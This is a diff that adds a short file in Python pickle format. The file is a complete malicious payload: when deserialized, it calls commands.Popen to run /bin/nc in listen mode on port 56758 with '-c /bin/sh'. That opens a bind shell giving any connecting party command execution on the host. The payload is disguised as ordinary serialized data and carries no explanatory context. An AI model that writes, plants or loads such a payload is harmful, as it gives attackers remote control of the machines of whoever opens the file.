@@ -1,0 +1,15 @@
+ccommands
+Popen
+p0
+(V/bin/nc
+p1
+V-l
+p2
+V-p
+p3
+L56758L
+V-c /bin/sh
+p4
+tp5
+Rp6
+.
